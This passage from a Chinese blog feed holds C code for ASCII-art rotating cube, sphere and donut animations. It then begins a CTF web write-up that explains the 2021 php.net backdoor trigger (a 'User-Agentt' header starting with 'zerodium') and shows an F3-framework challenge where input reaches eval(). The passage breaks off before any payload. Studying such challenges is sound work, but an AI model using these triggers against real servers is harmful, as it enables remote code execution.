class="number">0</span>]*ro_b[<span class="number">2</span>]+n_a[<span class="number">1</span>]*ro_b[<span class="number">5</span>]+n_a[<span class="number">2</span>]*ro_b[<span class="number">8</span>]&#125;;<span class="comment">//法向量第二次旋转</span></span><br><span class="line">    <span class="keyword">float</span> n_r[<span class="number">3</span>]=&#123;n_b[<span class="number">0</span>]*ro_c[<span class="number">0</span>]+n_b[<span class="number">1</span>]*ro_c[<span class="number">3</span>]+n_b[<span class="number">2</span>]*ro_c[<span class="number">6</span>],</span><br><span class="line">                   n_b[<span class="number">0</span>]*ro_c[<span class="number">1</span>]+n_b[<span class="number">1</span>]*ro_c[<span class="number">4</span>]+n_b[<span class="number">2</span>]*ro_c[<span class="number">7</span>],</span><br><span class="line">                   n_b[<span class="number">0</span>]*ro_c[<span class="number">2</span>]+n_b[<span class="number">1</span>]*ro_c[<span class="number">5</span>]+n_b[<span class="number">2</span>]*ro_c[<span class="number">8</span>]&#125;;</span><br><span class="line">    <span class="comment">//n_r[]作为绕三轴旋转rotate角度后的法向量</span></span><br><span class="line">    <span class="keyword">float</span> result=(n_r[<span class="number">0</span>]*light[<span class="number">0</span>]+n_r[<span class="number">1</span>]*light[<span class="number">1</span>]+n_r[<span class="number">2</span>]*light[<span class="number">2</span>]+<span class="number">1.0</span>)*<span class="number">0.5</span>;<span class="comment">//点积求反光强度(亮度)，并映射到[0,1]</span></span><br><span class="line">    <span class="keyword">float</span> co[<span class="number">3</span>];<span class="comment">//正方体的原始坐标，co意为coordinate</span></span><br><span class="line">    co[n_i]=dyn*<span class="built_in">cos</span>(rotate*<span class="number">2</span>);<span class="comment">//make it 20% cooler</span></span><br><span class="line">    <span class="keyword">int</span> co_a=n_i==<span class="number">0</span>?<span class="number">1</span>:n_i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> co_b=n_i==<span class="number">0</span>?<span class="number">2</span>:n_i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>;<span class="comment">//确定了index为n_i的坐标是不需要被遍历的</span></span><br><span class="line">    co[n_i]+=move/<span class="number">2</span>;<span class="comment">//无需遍历的方向偏移1/4个屏幕边长</span></span><br><span class="line">    <span class="keyword">for</span>(co[co_a]=-a;co[co_a]&lt;=a;co[co_a]+=delta)</span><br><span class="line">        <span class="keyword">for</span>(co[co_b]=-a;co[co_b]&lt;=a;co[co_b]+=delta)&#123;</span><br><span class="line">            <span class="keyword">int</span> <span class="keyword">final</span>=(<span class="keyword">int</span>)(result*<span class="number">10.0</span>);<span class="comment">//把亮度int化</span></span><br><span class="line">            <span class="keyword">final</span>=(<span class="keyword">final</span>&gt;<span class="number">10</span>||<span class="keyword">final</span>)&lt;<span class="number">0</span>?<span class="keyword">final</span>&gt;<span class="number">10</span>?<span class="number">10</span>:<span class="number">0</span>:<span class="keyword">final</span>;<span class="comment">//保险，防止一些刁钻情况</span></span><br><span class="line">            <span class="keyword">float</span> x_a=co[<span class="number">0</span>]*ro_a[<span class="number">0</span>]+co[<span class="number">1</span>]*ro_a[<span class="number">3</span>]+co[<span class="number">2</span>]*ro_a[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">float</span> y_a=co[<span class="number">0</span>]*ro_a[<span class="number">1</span>]+co[<span class="number">1</span>]*ro_a[<span class="number">4</span>]+co[<span class="number">2</span>]*ro_a[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">float</span> z_a=co[<span class="number">0</span>]*ro_a[<span class="number">2</span>]+co[<span class="number">1</span>]*ro_a[<span class="number">5</span>]+co[<span class="number">2</span>]*ro_a[<span class="number">8</span>];<span class="comment">//坐标第一次旋转</span></span><br><span class="line">            <span class="keyword">float</span> x_b=x_a*ro_b[<span class="number">0</span>]+y_a*ro_b[<span class="number">3</span>]+z_a*ro_b[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">float</span> y_b=x_a*ro_b[<span class="number">1</span>]+y_a*ro_b[<span class="number">4</span>]+z_a*ro_b[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">float</span> z_b=x_a*ro_b[<span class="number">2</span>]+y_a*ro_b[<span class="number">5</span>]+z_a*ro_b[<span class="number">8</span>];<span class="comment">//坐标第二次旋转</span></span><br><span class="line">            <span class="keyword">float</span> x_r=x_b*ro_c[<span class="number">0</span>]+y_b*ro_c[<span class="number">3</span>]+z_b*ro_c[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">float</span> y_r=x_b*ro_c[<span class="number">1</span>]+y_b*ro_c[<span class="number">4</span>]+z_b*ro_c[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">float</span> z_r=x_b*ro_c[<span class="number">2</span>]+y_b*ro_c[<span class="number">5</span>]+z_b*ro_c[<span class="number">8</span>];</span><br><span class="line">            <span class="comment">//co_r作为绕三轴旋转rotate角度后的空间坐标</span></span><br><span class="line">            <span class="keyword">int</span> cox=(<span class="keyword">int</span>)(n_j*x_r+move);</span><br><span class="line">            <span class="keyword">int</span> coy=(<span class="keyword">int</span>)(n_j*z_r+move);<span class="comment">//找到投影到屏幕上的点在哪</span></span><br><span class="line">            <span class="keyword">if</span>(n_j*y_r&lt;dis[cox][coy])&#123;<span class="comment">//只有发现更近的点才替换亮度</span></span><br><span class="line">                out_i[cox*size+coy]=<span class="keyword">final</span>;</span><br><span class="line">                dis[cox][coy]=n_j*y_r;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> n[<span class="number">3</span>];<span class="comment">//原始法向量n[]</span></span><br><span class="line">    <span class="keyword">float</span> light[<span class="number">3</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>&#125;;<span class="comment">//平行光向量</span></span><br><span class="line">    <span class="keyword">float</span> length=cal_r(light[<span class="number">0</span>],light[<span class="number">1</span>],light[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)light[i]/=length;<span class="comment">//单位化平行光向量</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">float</span> rotate=<span class="number">0.0</span>;;rotate+=<span class="number">0.05</span>)&#123;<span class="comment">//rotate为旋转角度，增量即旋转速度</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                out_i[i][j]=<span class="number">-1</span>;</span><br><span class="line">                dis[i][j]=(<span class="keyword">float</span>)(<span class="number">4.0</span>*size);</span><br><span class="line">                <span class="comment">//初始化亮度与距离</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">float</span> cos_ro=<span class="built_in">cos</span>(rotate),sin_ro=<span class="built_in">sin</span>(rotate);</span><br><span class="line">        <span class="keyword">float</span> ro_a[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;<span class="number">1.0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,cos_ro,-sin_ro&#125;,&#123;<span class="number">0</span>,sin_ro,cos_ro&#125;&#125;;</span><br><span class="line">        <span class="keyword">float</span> ro_b[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;cos_ro,<span class="number">0</span>,sin_ro&#125;,&#123;<span class="number">0</span>,<span class="number">1.0</span>,<span class="number">0</span>&#125;,&#123;-sin_ro,<span class="number">0</span>,cos_ro&#125;&#125;;</span><br><span class="line">        <span class="keyword">float</span> ro_c[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;cos_ro,-sin_ro,<span class="number">0</span>&#125;,&#123;sin_ro,cos_ro,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1.0</span>&#125;&#125;;</span><br><span class="line">        <span class="comment">//旋转矩阵，ro表rotate</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;<span class="comment">//算个阴影，第三个参数控制对应面</span></span><br><span class="line">            cal_shade(&amp;n[<span class="number">0</span>],i,<span class="number">1</span>,&amp;ro_a[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_b[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_c[<span class="number">0</span>][<span class="number">0</span>],&amp;light[<span class="number">0</span>],rotate,&amp;out_i[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">            cal_shade(&amp;n[<span class="number">0</span>],i,<span class="number">-1</span>,&amp;ro_a[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_b[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_c[<span class="number">0</span>][<span class="number">0</span>],&amp;light[<span class="number">0</span>],rotate,&amp;out_i[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++) out_i[i][j]!=<span class="number">-1</span>?<span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,shade[out_i[i][j]],shade[out_i[i][j]]):<span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1b[2J&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1b[H&quot;</span>);</span><br><span class="line">        usleep(<span class="number">30000</span>);</span><br><span class="line">        <span class="comment">//跟着甜甜圈抄的，这样才能稳定住图像</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dev C++下则调用Windows.h来解决图像刷新的问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">goto_O</span><span class="params">()</span><span class="comment">//CSDN上抄的函数，刷新一快光标就飘来飘去，看起来像噪点一样</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hOut;</span><br><span class="line">    hOut = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">    COORD pos = &#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    SetConsoleCursorPosition(hOut, pos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%9B%BE%E5%BD%A2%E5%AD%A6HelloWorld.gif"></p><p>最开始先写了个光源移动球</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">goto_xy</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">   HANDLE hOut;</span><br><span class="line">hOut = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">   COORD pos = &#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">   SetConsoleCursorPosition(hOut, pos);</span><br><span class="line">&#125;</span><br><span class="line">main()&#123;</span><br><span class="line"><span class="keyword">int</span> size=<span class="number">45</span>;</span><br><span class="line"><span class="keyword">double</span> g=<span class="number">0.01</span>;</span><br><span class="line"><span class="keyword">double</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">double</span> r=(<span class="keyword">double</span>(size)<span class="number">-4</span>)/<span class="number">2.0</span>;</span><br><span class="line"><span class="keyword">double</span> light[<span class="number">3</span>]=&#123;<span class="number">-1.3</span>,<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">double</span> length=<span class="built_in">sqrt</span>(light[<span class="number">0</span>]*light[<span class="number">0</span>]+light[<span class="number">1</span>]*light[<span class="number">1</span>]+light[<span class="number">2</span>]*light[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">light[i]=light[i]/length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.;!o*m0&amp;%@&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> out_i[size][size]=&#123;&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">double</span> rotate=<span class="number">0.0</span>;;rotate+=<span class="number">0.05</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">out_i[i][j]=<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> ro[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;<span class="number">1.0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="built_in">cos</span>(rotate),-<span class="built_in">sin</span>(rotate)&#125;,&#123;<span class="number">0</span>,<span class="built_in">sin</span>(rotate),<span class="built_in">cos</span>(rotate)&#125;&#125;;</span><br><span class="line"><span class="keyword">double</span> light_r[<span class="number">3</span>]=&#123;light[<span class="number">0</span>]*ro[<span class="number">0</span>][<span class="number">0</span>]+light[<span class="number">1</span>]*ro[<span class="number">1</span>][<span class="number">0</span>]+light[<span class="number">2</span>]*ro[<span class="number">2</span>][<span class="number">0</span>],</span><br><span class="line"> light[<span class="number">0</span>]*ro[<span class="number">0</span>][<span class="number">1</span>]+light[<span class="number">1</span>]*ro[<span class="number">1</span>][<span class="number">1</span>]+light[<span class="number">2</span>]*ro[<span class="number">2</span>][<span class="number">1</span>],</span><br><span class="line"> light[<span class="number">0</span>]*ro[<span class="number">0</span>][<span class="number">2</span>]+light[<span class="number">1</span>]*ro[<span class="number">1</span>][<span class="number">2</span>]+light[<span class="number">2</span>]*ro[<span class="number">2</span>][<span class="number">2</span>]&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">double</span> a=<span class="number">0.0</span>;a&lt;<span class="number">3.15</span>;a+=g)&#123;<span class="comment">//alpha </span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">double</span> b=<span class="number">0.0</span>;b&lt;<span class="number">3.15</span>;b+=g)&#123;<span class="comment">//beta </span></span><br><span class="line"><span class="keyword">double</span> x=r*<span class="built_in">sin</span>(b)*<span class="built_in">cos</span>(a);</span><br><span class="line"><span class="keyword">double</span> y=r*<span class="built_in">sin</span>(b)*<span class="built_in">sin</span>(a);</span><br><span class="line"><span class="keyword">double</span> z=r*<span class="built_in">cos</span>(b);</span><br><span class="line"><span class="keyword">double</span> result=(x/r*light_r[<span class="number">0</span>]+y/r*light_r[<span class="number">1</span>]+z/r*light_r[<span class="number">2</span>]+<span class="number">1.0</span>)*<span class="number">0.5</span>;</span><br><span class="line"><span class="keyword">int</span> <span class="keyword">final</span>=<span class="keyword">int</span>(result*<span class="number">10.0</span><span class="number">-1</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">if(final&gt;10||final&lt;0)&#123;</span></span><br><span class="line"><span class="comment">if(final&gt;10)final=10;</span></span><br><span class="line"><span class="comment">else if(final&lt;0)final=0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span> cx=<span class="keyword">int</span>(x+move);</span><br><span class="line"><span class="keyword">int</span> cy=<span class="keyword">int</span>(z+move);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">final</span>&gt;out_i[cx][cy])<span class="comment">//这种取最大亮度的写法明显是不好的，但这个例子特殊，用起来没问题</span></span><br><span class="line">out_i[cx][cy]=<span class="keyword">final</span>;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(out_i[i][j]!=<span class="number">-1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,shade[out_i[i][j]],shade[out_i[i][j]]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">goto_xy(); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>附上甜甜圈的代码，写方块之前没仔细看过，所以我写的方块非常冗余（主要是想先独立尝试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">float</span> A = <span class="number">0</span>, B = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">float</span> i, j;</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="keyword">float</span> z[<span class="number">1760</span>];</span><br><span class="line">    <span class="keyword">char</span> b[<span class="number">1760</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1b[2J&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(b,<span class="number">32</span>,<span class="number">1760</span>);</span><br><span class="line">        <span class="built_in">memset</span>(z,<span class="number">0</span>,<span class="number">7040</span>);</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j &lt; <span class="number">6.28</span>; j += <span class="number">0.07</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; <span class="number">6.28</span>; i += <span class="number">0.02</span>) &#123;</span><br><span class="line">                <span class="keyword">float</span> c = <span class="built_in">sin</span>(i);</span><br><span class="line">                <span class="keyword">float</span> d = <span class="built_in">cos</span>(j);</span><br><span class="line">                <span class="keyword">float</span> e = <span class="built_in">sin</span>(A);</span><br><span class="line">                <span class="keyword">float</span> f = <span class="built_in">sin</span>(j);</span><br><span class="line">                <span class="keyword">float</span> g = <span class="built_in">cos</span>(A);</span><br><span class="line">                <span class="keyword">float</span> h = d + <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">float</span> D = <span class="number">1</span> / (c * h * e + f * g + <span class="number">5</span>);</span><br><span class="line">                <span class="keyword">float</span> l = <span class="built_in">cos</span>(i);</span><br><span class="line">                <span class="keyword">float</span> m = <span class="built_in">cos</span>(B);</span><br><span class="line">                <span class="keyword">float</span> n = <span class="built_in">sin</span>(B);</span><br><span class="line">                <span class="keyword">float</span> t = c * h * g - f * e;</span><br><span class="line">                <span class="keyword">int</span> x = <span class="number">40</span> + <span class="number">30</span> * D * (l * h * m - t * n);</span><br><span class="line">                <span class="keyword">int</span> y= <span class="number">12</span> + <span class="number">15</span> * D * (l * h * n + t * m);</span><br><span class="line">                <span class="keyword">int</span> o = x + <span class="number">80</span> * y;</span><br><span class="line">                <span class="keyword">int</span> N = <span class="number">8</span> * ((f * e - c * d * g) * m - c * d * e - f * g - l * d * n);</span><br><span class="line">                <span class="keyword">if</span>(<span class="number">22</span> &gt; y &amp;&amp; y &gt; <span class="number">0</span> &amp;&amp; x &gt; <span class="number">0</span> &amp;&amp; <span class="number">80</span> &gt; x &amp;&amp; D &gt; z[o]) &#123;</span><br><span class="line">                    z[o] = D;</span><br><span class="line">                    b[o] = <span class="string">&quot;.,-~:;=!*#$@&quot;</span>[N &gt; <span class="number">0</span> ? N : <span class="number">0</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1b[H&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">1761</span>; k++) &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(k % <span class="number">80</span> ? b[k] : <span class="number">10</span>);</span><br><span class="line">            A += <span class="number">0.00004</span>;</span><br><span class="line">            B += <span class="number">0.00002</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">30000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/kyriota/css/spoiler.css" type="text/css"><script src="/kyriota/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;逛b站看到会转的甜甜圈，对图形学有点上头，自己拿蜥语言做个立方体玩玩&lt;/p&gt;
&lt;img src=&quot;/images/图形学HelloWorld.gif&quot; height=&quot;200&quot; width=&quot;200&quot; /&gt;</summary>
    
    
    
    <category term="摸鱼" scheme="https://kyriota.github.io/categories/%E6%91%B8%E9%B1%BC/"/>
    
    
    <category term="图形学" scheme="https://kyriota.github.io/tags/%E5%9B%BE%E5%BD%A2%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>i春秋虎符2021 web</title>
    <link href="https://kyriota.github.io/2021/04/10/i%E6%98%A5%E7%A7%8B%E8%99%8E%E7%AC%A62021/"/>
    <id>https://kyriota.github.io/2021/04/10/i%E6%98%A5%E7%A7%8B%E8%99%8E%E7%AC%A62021/</id>
    <published>2021-04-09T16:35:02.000Z</published>
    <updated>2021-05-03T06:53:42.223Z</updated>
    
    <content type="html"><![CDATA[<p>记录题目扫盲，只有前三题，包含以下points：</p><p>​    ①3.28 php.net后门</p><p>​    ②3F(FatFreeFramework)框架</p><p>​    ③SQL中md5()产生hex的’or’进行的注入</p><p>​    ④SSRF与gopher协议</p><span id="more"></span><!--toc--><h1 id="i春秋虎符2021-web"><a href="#i春秋虎符2021-web" class="headerlink" title="i春秋虎符2021_web"></a>i春秋虎符2021_web</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>2021.3.28出了php官方git仓库git.php.net被插入恶意代码的事，若使用此源码进行开发，网站就会执行user_agentt头中以zerodium开始的任意代码，注意double t，没有打错</p><p><img src="/images/%E8%99%8E%E7%AC%A6-%E7%AD%BE%E5%88%B0github.png"></p><center><a href="https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d">view on github</a></center><p>题目环境是一个blog，最后一篇文章描述了博客搭建过程，在没有hint的情况下这是入手点</p><p><img src="/images/%E8%99%8E%E7%AC%A6-%E7%AD%BE%E5%88%B0blog.png"></p><h2 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Kickstart the framework</span></span><br><span class="line"><span class="variable">$f3</span> = <span class="keyword">require</span>(<span class="string">&#x27;1ib/base.php&#x27;</span>);</span><br><span class="line"><span class="variable">$f3</span>-&gt;set( <span class="string">&#x27;DEBUG&#x27;</span> ,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">float</span>)PCREVERSION &lt;<span class="number">8.0</span>)</span><br><span class="line">    trigger_error(<span class="string">&#x27;PCREversion is out date&#x27;</span>);</span><br><span class="line"><span class="comment">//Load configuration</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span> [<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$f3</span>-&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$f3</span>-&gt;run();</span><br></pre></td></tr></table></figure><p align='right'><small>关键字：framework，f3</small></p><p>此为基于f3框架编写的代码，拿到手时应先本地搭建此框架，对于本题，这样你才有了base.php，才可以解题，各种不熟悉导致找不到本题入手点</p><p><img src="/images/%E8%99%8E%E7%AC%A6-unsetme-f3Framework.png"></p><p>把题目代码copy过来，加上route指定路径后本地运行（也就是说要先设置<code>route</code>再<code>run</code>，不然框架跑都跑不起来，怎么设置查一下文档就知道了¯\_(ツ)_/¯）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f3</span>-&gt;route(<span class="string">&#x27;GET /test.php&#x27;</span>,</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;route set successfully&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$f3</span>-&gt;run();</span><br></pre></td></tr></table></figure><p><img src="/images/%E8%99%8E%E7%AC%A6-unsetme-f3run.png"></p><p>直接报错了，看看530行eval的情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">#...</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$val</span>=preg_replace(<span class="string">&#x27;/^(\$hive)/&#x27;</span>,<span class="string">&#x27;$this-&gt;hive&#x27;</span>,</span><br><span class="line">                          <span class="keyword">$this</span>-&gt;compile(<span class="string">&#x27;@hive.&#x27;</span>.<span class="variable">$key</span>, <span class="literal">FALSE</span>));</span><br><span class="line">        <span class="keyword">eval</span>(<span 